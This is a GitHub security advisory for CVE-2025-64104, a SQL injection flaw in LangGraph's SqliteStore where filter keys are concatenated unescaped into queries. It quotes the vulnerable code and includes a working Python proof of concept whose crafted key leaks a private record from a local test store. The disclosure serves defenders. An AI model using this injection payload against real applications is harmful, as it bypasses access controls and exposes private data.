# [H] LangGraph SQLite Checkpoint Filter Key SQL Injection POC for SqliteStore

## Summary
Severity: High
Advisory: GHSA-7p73-8jqx-23r8
CVE: CVE-2025-64104
CWE: CWE-89
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2025-10-29
Source: https://github.com/advisories/GHSA-7p73-8jqx-23r8
Type: github-advisory

## Affected
- PyPI: `langgraph-checkpoint-sqlite` — affected >=0 <2.0.11

## Details
### Summary
LangGraph's SQLite store implementation contains SQL injection vulnerabilities using direct string concatenation without proper parameterization, allowing attackers to inject arbitrary SQL and bypass access controls.

### Details
[`/langgraph/libs/checkpoint-sqlite/langgraph/store/sqlite/base.py`](https://github.com/langchain-ai/langgraph/blob/ee5d052a07aadd76dae123a27009ea0a3694fa0a/libs/checkpoint-sqlite/langgraph/store/sqlite/base.py#L407)

The key portion of the JSON path is concatenated directly into the SQL string without sanitation. There's a few different occurrences within the file.

```python
  filter_conditions.append(
      "json_extract(value, '$."
      + key  # <-- Directly concatenated, no escaping!
      + "') = '"
      + value.replace("'", "''")  # <-- Only value is escaped
      + "'"
  )
```

### Who is affected

This issue affects **only developers or projects that directly use the `checkpoint-sqlite` store**. 

An application is vulnerable only if it:
1. Instantiates the `SqliteStore` from the `checkpoint-sqlite` package, **and**
2. Builds the `filter` argument using keys derived from **untrusted or user-supplied input** (such as query parameters, request bodies, or other external data).

If filter keys are static or validated/allowlisted before being passed to the store, the risk does not apply.

Note: users of LangSmith deployments (previously known as LangGraph Platform) are not affected as those deployments rely on a different checkpointer implementation.

### PoC
_Complete instructions, including specific configuration details, to reproduce the vulnerability._

```python
#!/usr/bin/env python3
"""Minimal SQLite Key Injection POC for LangGraph"""

from langgraph.store.sqlite import SqliteStore

# Create store with test data
with SqliteStore.from_conn_string(":memory:") as store:
    store.setup()
    
    # Add public and private documents
    store.put(("docs",), "public", {"access": "public", "data": "public info"})
    store.put(("docs",), "private", {"access": "private", "data": "secret", "password": "123"})
    
    # Normal query - returns 1 public document
    normal = store.search(("docs",), filter={"access": "public"})
    print(f"Normal query: {len(normal)} docs")
    
    # SQL injection via malicious key
    malicious_key = "access') = 'public' OR '1'='1' OR json_extract(value, '$."
    injected = store.search(("docs",), filter={malicious_key: "dummy"})
    
    print(f"Injected query: {len(injected)} docs")
    for doc in injected:
        if doc.value.get("access") == "private":
            print(f"LEAKED: {doc.value}")
```

## References
- https://github.com/langchain-ai/langgraph/security/advisories/GHSA-7p73-8jqx-23r8
- https://nvd.nist.gov/vuln/detail/CVE-2025-64104
- https://github.com/langchain-ai/langgraph/commit/bc9d45b476101e441cb1cc602dea03eb29232de4
- https://github.com/langchain-ai/langgraph
